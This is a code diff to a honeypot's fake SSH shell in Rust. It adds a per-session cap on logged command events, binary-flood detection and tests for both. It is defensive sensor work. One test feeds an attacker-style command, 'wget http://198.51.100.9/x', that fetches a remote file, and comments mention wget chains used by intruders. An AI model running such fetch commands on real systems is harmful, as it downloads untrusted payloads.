@@ -70,6 +70,13 @@ pub struct EmitContext {
     pub session_id: Option<uuid::Uuid>,
 }
 
+/// Per-session ceiling on `honeypot_command_exec` events. A real interactive attacker runs a
+/// bounded kill chain (tens of commands); an unbounded stream is a flood - one IP produced >20k
+/// command events by streaming binary over the channel. Past this, the shell keeps responding but
+/// stops appending per-line events (one marker is emitted at the boundary), so a single session
+/// cannot pollute the append-only ledger without bound.
+const MAX_COMMANDS_PER_SESSION: u64 = 256;
+
 /// The fake interactive shell. One instance per SSH session; `cwd` is the only mutable state,
 /// tracking a `cd` across calls the way a real shell would.
 pub struct FakeShell {
@@ -78,6 +85,13 @@ pub struct FakeShell {
     cwd: String,
     /// Per-session de-obfuscation for XOR-encoded command probes (see `command_codec`).
     codec: CommandCodec,
+    /// Count of input lines this session (whether or not each produced an event); drives the flood
+    /// cap.
+    command_count: u64,
+    /// Whether the one-per-session binary-flood marker has been emitted.
+    binary_flagged: bool,
+    /// Whether the one-per-session command-cap marker has been emitted.
+    cap_flagged: bool,
 }
 
 impl FakeShell {
@@ -87,6 +101,9 @@ impl FakeShell {
             ctx,
             cwd: "/root".to_string(),
             codec: CommandCodec::new(),
+            command_count: 0,
+            binary_flagged: false,
+            cap_flagged: false,
         }
     }
 
@@ -117,22 +134,86 @@ impl FakeShell {
         // decoded form and key are annotated alongside so the grammar can respond and an analyst can
         // read it. Dispatch and URL capture run on the DECODED line.
         let (decoded, key) = self.codec.decode(line);
+        self.command_count += 1;
+        let parts: Vec<&str> = decoded.split_whitespace().collect();
 
-        let sanitized_cmd = sanitize_value(line, MAX_COMMAND_LEN);
-        let mut metadata = serde_json::json!({
-            "protocol_label": self.ctx.protocol_label,
-            "command": sanitized_cmd,
-        });
-        if let Some(k) = key
-            && let Some(obj) = metadata.as_object_mut()
-        {
-            obj.insert(
-                "command_decoded".to_string(),
-                serde_json::json!(sanitize_value(&decoded, MAX_COMMAND_LEN)),
-            );
-            obj.insert("xor_key".to_string(), serde_json::json!(k));
-        }
-        let event = SensorEvent {
+        // Two floods must never pollute the append-only ledger with one event per line: a
+        // binary/non-text line (an SSH/telnet channel tunneling binary, or a fuzzer - not a
+        // command), and an unbounded stream of commands from one session (a single IP produced
+        // >20k `command_exec` events this way). In both cases we STILL dispatch below so the fake
+        // shell keeps responding - a silently dead session is itself a tell - but emit at most ONE
+        // marker event per session per flood kind rather than one event per garbage line.
+        let events = if is_binary_line(&decoded) {
+            if std::mem::replace(&mut self.binary_flagged, true) {
+                Vec::new()
+            } else {
+                vec![self.command_event(serde_json::json!({
+                    "protocol_label": self.ctx.protocol_label,
+                    "command": "<binary channel data; per-line command events suppressed>",
+                    "flood": "binary",
+                }))]
+            }
+        } else if self.command_count > MAX_COMMANDS_PER_SESSION {
+            if std::mem::replace(&mut self.cap_flagged, true) {
+                Vec::new()
+            } else {
+                vec![self.command_event(serde_json::json!({
+                    "protocol_label": self.ctx.protocol_label,
+                    "command": format!(
+                        "<per-session command cap of {MAX_COMMANDS_PER_SESSION} reached; further commands suppressed>"
+                    ),
+                    "flood": "command_cap",
+                }))]
+            }
+        } else {
+            // Normal command: the event records the RAW line verbatim (the hash chain must see
+            // exactly what crossed the wire); the decoded form and XOR key are annotated alongside.
+            let mut metadata = serde_json::json!({
+                "protocol_label": self.ctx.protocol_label,
+                "command": sanitize_value(line, MAX_COMMAND_LEN),
+            });
+            if let Some(k) = key
+                && let Some(obj) = metadata.as_object_mut()
+            {
+                obj.insert(
+                    "command_decoded".to_string(),
+                    serde_json::json!(sanitize_value(&decoded, MAX_COMMAND_LEN)),
+                );
+                obj.insert("xor_key".to_string(), serde_json::json!(k));
+            }
+            let mut evs = vec![self.command_event(metadata)];
+            // A URL buried in a `sh -c "wget ...; ..."` chain (where the tokenizer's split loses the
+            // quoting) is recovered by scanning the raw line. `download_target` returns a real token.
+            if let Some(url) = download_target(&parts).or_else(|| url_if_fetch_line(&decoded)) {
+                let sanitized_url = sanitize_value(url, MAX_URL_LEN);
+                evs.push(SensorEvent {
+                    v: WIRE_VERSION,
+                    source_ip: self.ctx.source_ip,
+                    wan_ip: self.ctx.wan_ip,
+                    sensor: self.ctx.protocol_label.clone(),
+                    signal_type: SIGNAL_HONEYPOT_FILE_DOWNLOAD.into(),
+                    protocol: PROTO_TCP.into(),
+                    authenticated: self.ctx.authenticated,
+                    observed_at: chrono::Utc::now(),
+                    metadata: serde_json::json!({
+                        "protocol_label": self.ctx.protocol_label,
+                        "url": sanitized_url,
+                    }),
+                    sample: None,
+                    session_id: self.ctx.session_id,
+                });
+            }
+            evs
+        };
+
+        let output = self.dispatch(&parts);
+        (output, events)
+    }
+
+    /// Build a `honeypot_command_exec` event carrying `metadata`, stamped from the session context.
+    /// Shared by the normal-command path and the two flood-marker paths.
+    fn command_event(&self, metadata: serde_json::Value) -> SensorEvent {
+        SensorEvent {
             v: WIRE_VERSION,
             source_ip: self.ctx.source_ip,
             wan_ip: self.ctx.wan_ip,
@@ -144,37 +225,7 @@ impl FakeShell {
             metadata,
             sample: None,
             session_id: self.ctx.session_id,
-        };
-
-        let parts: Vec<&str> = decoded.split_whitespace().collect();
-        let output = self.dispatch(&parts);
-
-        let mut events = vec![event];
-
-        // Direct/busybox fetch commands are recognised from the tokens; a URL buried in a
-        // `sh -c "wget ...; ..."` chain (where the tokenizer's split loses the quoting) is recovered
-        // by scanning the raw line. `download_target` only returns a real (non-empty) token.
-        if let Some(url) = download_target(&parts).or_else(|| url_if_fetch_line(&decoded)) {
-            let sanitized_url = sanitize_value(url, MAX_URL_LEN);
-            events.push(SensorEvent {
-                v: WIRE_VERSION,
-                source_ip: self.ctx.source_ip,
-                wan_ip: self.ctx.wan_ip,
-                sensor: self.ctx.protocol_label.clone(),
-                signal_type: SIGNAL_HONEYPOT_FILE_DOWNLOAD.into(),
-                protocol: PROTO_TCP.into(),
-                authenticated: self.ctx.authenticated,
-                observed_at: chrono::Utc::now(),
-                metadata: serde_json::json!({
-                    "protocol_label": self.ctx.protocol_label,
-                    "url": sanitized_url,
-                }),
-                sample: None,
-                session_id: self.ctx.session_id,
-            });
         }
-
-        (output, events)
     }
 
     /// Produce the canned terminal output for one already-tokenized, non-empty command line.
@@ -303,6 +354,23 @@ impl FakeShell {
 /// invocation resolves the way a real shell finds a command on PATH. Shared by [`FakeShell::dispatch`]
 /// and [`download_target`] so they agree on what a command is; without this the two drift and a
 /// full-path fetch answers in-persona while its download evidence is silently dropped.
+/// A line dominated by non-printable-ASCII characters is a binary flood (an SSH/telnet channel
+/// tunneling binary, or a fuzzer), not a shell command. `String::from_utf8_lossy` turns invalid
+/// bytes into U+FFFD, and high bytes that do not form valid UTF-8 land there too, so a genuine
+/// binary stream is mostly non-printable while a real command is ~all printable ASCII. A `> 30%`
+/// non-printable ratio flags the former without catching an ordinary command carrying a stray byte.
+fn is_binary_line(s: &str) -> bool {
+    let total = s.chars().count();
+    if total == 0 {
+        return false;
+    }
+    let nonprintable = s
+        .chars()
+        .filter(|&c| c != '\t' && !(' '..='~').contains(&c))
+        .count();
+    nonprintable * 100 / total > 30
+}
+
 fn command_basename(token: &str) -> &str {
     token.rsplit('/').next().unwrap_or(token)
 }
@@ -877,6 +945,51 @@ mod shell_detection_tests {
         assert_eq!(events[0].metadata["command"], "uname -a");
         assert!(events[0].metadata.get("command_decoded").is_none());
         assert!(events[0].metadata.get("xor_key").is_none());
+    }
+
+    #[test]
+    fn binary_flood_emits_one_marker_event_not_one_per_line() {
+        // A channel streaming binary (an SSH IP produced >20k such "command" events) must not add
+        // one ledger event per garbage line.
+        let mut sh = shell();
+        let garbage = "\u{FFFD}".repeat(40);
+
+        let (_out, first) = sh.handle_input(&garbage);
+        assert_eq!(
+            first.len(),
+            1,
+            "the first binary line emits a single marker"
+        );
+        assert_eq!(first[0].metadata["flood"], "binary");
+
+        let mut more = 0;
+        for _ in 0..100 {
+            more += sh.handle_input(&garbage).1.len();
+        }
+        assert_eq!(more, 0, "subsequent binary lines emit no further events");
+    }
+
+    #[test]
+    fn command_flood_is_capped_to_one_marker_past_the_per_session_limit() {
+        let cap = super::MAX_COMMANDS_PER_SESSION;
+        let mut sh = shell();
+        let mut total = 0;
+        for i in 0..(cap + 50) {
+            total += sh.handle_input(&format!("cmd{i}")).1.len();
+        }
+        // `cap` real command events + exactly one cap marker; never one per line.
+        assert_eq!(total, cap as usize + 1);
+    }
+
+    #[test]
+    fn a_normal_fetch_command_still_emits_its_command_and_download_events() {
+        let (_out, events) = shell().handle_input("wget http://198.51.100.9/x");
+        assert_eq!(
+            events.len(),
+            2,
+            "a fetch emits the command event + the download event"
+        );
+        assert!(events.iter().any(|e| e.metadata.get("url").is_some()));
     }
 
     #[test]
